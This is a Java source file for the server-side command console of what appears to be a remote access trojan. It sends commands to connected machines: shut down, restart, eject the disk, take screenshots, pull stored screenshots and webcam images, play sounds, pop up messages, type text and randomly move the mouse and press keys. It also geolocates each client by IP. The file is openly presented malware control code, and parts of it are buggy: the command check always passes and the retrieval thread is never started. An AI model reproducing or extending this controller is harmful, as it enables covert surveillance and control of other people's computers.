import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.maxmind.geoip2.model.CountryResponse;
import com.maxmind.geoip2.model.IspResponse;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Map;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * allows for the control of the clients from the server
 */
public class ClientCommander implements Runnable
{
    /** holds all the clients that are currently connected to the server */
    private Map<InetAddress, ConnectedClient> connectedClients;

    private static boolean secondCmd = false; //todo remove

    public ClientCommander()
    {
        connectedClients = Server.getOnlineClients();
    }

    public void run()
    {
        try
        {
            waitForCommand();
        }
        catch(NullCommandException | IOException excp)
        {
            System.out.println("run() clientcommander exception");
            excp.printStackTrace();
        }
    }

    /**
     * waits for the user of the server to type a command
     */
    private void waitForCommand() throws NullCommandException, IOException
    {
        while(true)
        {
            System.out.print("> ");
            String command = new Scanner(System.in).nextLine(); // blocks

            if(secondCmd) // so if you close the connection after sending a sound command, everything works...
            {
                ConnectedClient client = connectedClients.get(InetAddress.getByName("127.0.0.1")); // todo: remove
                client.getConnection().getOutputStream().close();
            }


            if(commandValid(command.split("\\s+")[0]))
                parseAndSendCommand(command);
            else
                System.out.println("> Unknown command: " + command.split("\\s+")[0]);


            secondCmd = true;
        }
    }

    /**
     * checks to see if the command exists
     * @param command the command to check
     * @return true if the command is valid, false otherwise
     */
    private boolean commandValid(String command)
    {
        command = command.toLowerCase();
        return command != null || command.equals("retrieve") || command.equals("type") || command.equals("chaos") || command.equals("help") || command.equals("count") || command.equals("online") || command.equals("eject") || command.equals("sound") || command.equals("shutdown") || command.equals("restart") || command.equals("screenshot") || command.equals("msg");
    }

    /**
     * properly tokenises commands, allowing for variable length arguments for commands
     * @param fullCommand the full command the user typed
     * @return a list containing each part of the command. Quoted arguments are treated as one part, for example
     * msg all "hello there" will be split into: msg, all, hello there
     */
    private ArrayList<String> tokeniseCommand(String fullCommand)
    {
        ArrayList<String> commandTokens = new ArrayList<>();
        Pattern regex = Pattern.compile("[^\\s\"']+|\"([^\"]*)\"|'([^']*)'"); // allows quoted args to be treated as one
        Matcher regexMatcher = regex.matcher(fullCommand);
        while (regexMatcher.find()) {
            if (regexMatcher.group(1) != null) {
                // Add double-quoted string without the quotes
                commandTokens.add(regexMatcher.group(1));
            } else if (regexMatcher.group(2) != null) {
                // Add single-quoted string without the quotes
                commandTokens.add(regexMatcher.group(2));
            } else {
                // Add unquoted word
                commandTokens.add(regexMatcher.group());
            }
        }
        return commandTokens;
    }

    private void printHelp(String command)
    {
        if(command == null) // user wants full help
            System.out.println("count\nonline\nhelp\neject HOST\nshutdown HOST\nrestart HOST\nscreenshot HOST\nsound HOST /path/to/local/sound/file\nmsg HOST \"message body\" \"message title\" type\nchaos HOST DURATION DELAY\ntype HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
        else
        {
            if(command.equals("count"))
                System.out.println("count displays the number of currently connected clients.\nExample usage:\n\tcount");
            else if(command.equals("online"))
                System.out.println("online displays info about each of the connected clients, this includes their IP address and geolocation.\nExample usage:\n\tonline");
            else if(command.equals("eject"))
                System.out.println("eject will eject the disk / disk tray on the client.\nExample usage:\n\teject 127.0.0.1");
            else if(command.equals("shutdown"))
                System.out.println("shutdown will turn off the clients computer.\nExample usage:\n\tshutdown 127.0.0.1");
            else if(command.equals("restart"))
                System.out.println("restart will restart the clinets computer.\nExample usage:\n\trestart 127.0.0.1");
            else if(command.equals("screenshot"))
                System.out.println("screenshot will take a screenshot of the clients screen.\nExample usage:\n\tscreenshot 127.0.0.1");
            else if(command.equals("sound"))
                System.out.println("sound will play a sound on the clients computer.\nExample usage:\n\tsound 127.0.0.1 /path/to/local/sound/file");
            else if(command.equals("msg"))
                System.out.println("msg will send a message that will be displayed as a message box on the clients computer.\nExample usage:\n\tmsg 127.0.0.1 \"message body\" \"title of the message box\" type\ntype can be any of the following: error, info, warning");
            else if(command.equals("chaos"))
                System.out.println("chaos will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\tchaos 127.0.0.1 DURATION DELAY\nDURATION is the time in ms for the chaos to last\nDELAY is the time in ms between each random act of chaos");
            else if(command.equals("type"))
                System.out.println("type will type the provided message on the clients computer.\nExample usage:\n\ttype 127.0.0.1 \"this is will get typed out\"");
            else if(command.equals("retrieve"))
                System.out.println("retrieve will get all the screenshots/webcam images taken on the clients computer and transfer them to the server.\nExample usage:\n\tretrieve 127.0.0.1");
        }
    }

    /**
     * uses the command input by the server user to execute the command on the
     * specified clients
     * @param fullCommand the users command input. Different commands have different args.
     * @throws UnknownHostException thrown if the host provided is incorrect
     */
    private void parseAndSendCommand(String fullCommand) throws NullCommandException, IOException
    {
        ArrayList<String> commandTokens = tokeniseCommand(fullCommand);
        String command = commandTokens.get(0);

        // Zero argument commands: online, count, help
        // e.g. count
        if(command.equals("online"))
        {
            printOnlineClients();
            return;
        }

        if(command.equals("count"))
        {
            printOnlineCount();
            return;
        }

        if(command.equals("help"))
        {
            if(commandTokens.size() == 2)
                printHelp(commandTokens.get(1));
            else
                printHelp(null);
            return;
        }

        // One argument commands: eject, shutdown, reboot, screenshot, retrieve
        // e.g. eject 127.0.0.1
        String host = null;
        if(commandTokens.size() > 1)
            host = commandTokens.get(1);
        if(host == null)
            throw new NullCommandException("Host not provided");

        ConnectedClient target = null;
        if(host.equals("all"))
            sendCommandAll(command);
        else // find the specified client
            target = connectedClients.get(InetAddress.getByName(host));

        if(target == null && !host.equals("all"))
            throw new UnknownHostException(host + " isn't online or doesn't exist");

        if(!host.equals("all"))
            target.sendCommand(command); // send the cmd to the specified connected client

        if(command.equals("retrieve"))
        {
            new Thread(new Retriever(target.getConnection()));
            return;
        }

        // Two argument commands: sound, type
        // e.g. sound 127.0.0.1 /path/to/sound/file
        String argument = null;
        if(commandTokens.size() == 3)
        {
            argument = commandTokens.get(2);
            if(command.equals("type"))
            {
                if(host.equals("all")) // command has already been sent, just need to send argument now
                    sendCommandAll(argument);
                else
                    target.sendCommand(argument); // if the client recieves the msg command it knows to read the next line of input (the msg itself)
            }
            else
            {
                if(command.equals("sound")) // special as we need to send the sound file to the client
                {
                    File sound = new File(argument);
                    if(host.equals("all"))
                    {
                        sendFileAll(sound);

                    }
                    else
                    {
                        target.sendFile(sound);
                    }
                }
            }
        }

        // Three argument commands: chaos
        // e.g. chaos all 60000 200
        String length, delay;
        if(commandTokens.size() == 4)
        {
            length = commandTokens.get(2);
            delay = commandTokens.get(3);
            if(host.equals("all"))
            {
                sendCommandAll(length);
                sendCommandAll(delay);
            }
            else
            {
                target.sendCommand(length);
                target.sendCommand(delay);
            }
        }

        // Four argument commands: msg
        // e.g. msg 127.0.0.1 "message here" "title here" warning
        String msg, title, type;
        if(commandTokens.size() == 5)
        {
            msg = commandTokens.get(2);
            title = commandTokens.get(3);
            type = commandTokens.get(4);
            if(host.equals("all"))
            {
                sendCommandAll(msg);
                sendCommandAll(title);
                sendCommandAll(type);
            }
            else
            {
                target.sendCommand(msg);
                target.sendCommand(title);
                target.sendCommand(type);
            }
        }
    }

    private void sendFileAll(File toSend) throws IOException
    {
        for (Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
            client.getValue().sendFile(toSend);
    }

    /**
     * iterates through each connected client and issues the command
     * @param command the command(s) to send to each client
     */
    private void sendCommandAll(String command)
    {
        for (Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
            client.getValue().sendCommand(command);
    }

    /**
     * called when the "count" command is used
     * prints out the number of currently connected clients
     */
    private void printOnlineCount()
    {
        System.out.println("Online: " + connectedClients.size());
    }

    /**
     * prints online client info including their rough location in the world (city & country) and the ISP detected
     * @throws IOException if the database readers fail to reader the provided database
     */
    private void printOnlineClients() throws IOException
    {
        File countryDB = new File("geolocation/GeoLite2-Country.mmdb");
        File cityDB = new File("geolocation/GeoLite2-City.mmdb");
        DatabaseReader countryReader = new DatabaseReader.Builder(countryDB).build();
        DatabaseReader cityReader = new DatabaseReader.Builder(cityDB).build();
        for(Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
        {
            System.out.print(client.getKey().toString().replace("/", ""));
            try
            {
                CountryResponse country = countryReader.country(client.getKey());
                CityResponse city = cityReader.city(client.getKey());
                IspResponse isp = cityReader.isp(client.getKey());
                System.out.println("\t[ " + city.getCity() + ", " + country.getCountry() + ", " + isp.getIsp() + " ]");
            }
            catch(GeoIp2Exception geoExcp)
            {
                System.out.println("\t[ UNKNOWN ]");
            }
        }

        countryReader.close();
        cityReader.close();
    }
}
